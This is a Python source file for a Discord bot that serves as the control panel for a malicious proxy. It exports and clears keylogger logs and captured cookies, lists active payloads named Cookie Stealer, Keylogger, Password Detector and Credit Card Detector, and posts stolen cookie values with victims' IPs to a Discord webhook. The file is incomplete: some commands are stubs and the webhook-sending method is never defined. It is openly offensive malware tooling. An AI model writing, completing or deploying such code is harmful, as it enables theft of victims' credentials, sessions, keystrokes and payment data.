import discord
from discord.ext import commands
import json
import os
from datetime import datetime

class ProxyBot(commands.Bot):
    def __init__(self, webhook_url):
        super().__init__(command_prefix='/', intents=discord.Intents.all())
        self.webhook_url = webhook_url
        self.proxy_running = True
        
    async def setup_hook(self):
        await self.tree.sync()  # Sync slash commands
        
    def format_embed(self, title, description, color=0xc50f1f):
        return discord.Embed(
            title=title,
            description=description,
            color=color,
            timestamp=datetime.now()
        )

class DiscordBot:
    def __init__(self, webhook_url, token):
        self.webhook_url = webhook_url
        self.bot = ProxyBot(webhook_url)
        self.setup_commands()
        self.token = token

    def setup_commands(self):
        @self.bot.tree.command(name="help", description="Display all available commands")
        async def help(interaction: discord.Interaction):
            commands = """
            🔍 **Available Commands**
            `/help` - Show this help message
            `/exportkl` - Export and clear keylogger data
            `/exportck` - Export and clear cookie data
            `/stop` - Stop the proxy server
            `/payloads` - View payload status
            `/clear` - Clear all data
            `/stats` - Show current statistics
            """
            await interaction.response.send_message(embed=self.bot.format_embed("Help", commands))

        @self.bot.tree.command(name="exportkl", description="Export and clear keylogger data")
        async def exportkl(interaction: discord.Interaction):
            try:
                with open('keylogs.json', 'r') as f:
                    data = json.load(f)
                
                if not data:
                    await interaction.response.send_message("No keylogger data available!")
                    return

                # Create a temporary file
                with open('temp_keylog.json', 'w') as f:
                    json.dump(data, f, indent=2)
                
                # Send file
                await interaction.response.send_message(
                    file=discord.File('temp_keylog.json'),
                    embed=self.bot.format_embed("Keylogger Export", f"📤 Exported {len(data)} entries")
                )
                
                # Clear the data
                with open('keylogs.json', 'w') as f:
                    json.dump([], f)
                
                # Cleanup
                os.remove('temp_keylog.json')
                
            except Exception as e:
                await interaction.response.send_message(f"Error: {str(e)}")

        @self.bot.tree.command(name="exportck", description="Export and clear cookie data")
        async def exportck(interaction: discord.Interaction):
            # Similar to exportkl but for cookies.json
            pass  # Implementation similar to exportkl

        @self.bot.tree.command(name="stop", description="Stop the proxy server")
        async def stop(interaction: discord.Interaction):
            await interaction.response.send_message(
                embed=self.bot.format_embed("Shutdown", "🛑 Stopping proxy server...")
            )
            self.bot.proxy_running = False
            # You'll need to implement the actual stopping mechanism

        @self.bot.tree.command(name="payloads", description="View payload status")
        async def payloads(interaction: discord.Interaction):
            payloads = {
                "Cookie Stealer": True,
                "Keylogger": True,
                "Password Detector": True,
                "Credit Card Detector": True,
                "Email Detector": True,
                "Geolocation": True
            }
            
            status = "\n".join([
                f"{'🟢' if status else '🔴'} {name}"
                for name, status in payloads.items()
            ])
            
            await interaction.response.send_message(
                embed=self.bot.format_embed("Payload Status", status)
            )

    def send_cookie_alert(self, cookie_data):
        embed = {
            "title": "🍪 New Cookie Captured",
            "color": 0xc50f1f,
            "fields": [
                {"name": "Name", "value": cookie_data['name'], "inline": True},
                {"name": "Value", "value": cookie_data['value'][:100] + "..." if len(cookie_data['value']) > 100 else cookie_data['value'], "inline": True},
                {"name": "URL", "value": cookie_data['url'], "inline": False},
                {"name": "IP", "value": cookie_data['ip'], "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }
        self.send_webhook({"embeds": [embed]})

    # ... (other alert methods for keylogger, sensitive data, etc.)

    def start(self):
        self.bot.run(self.token)
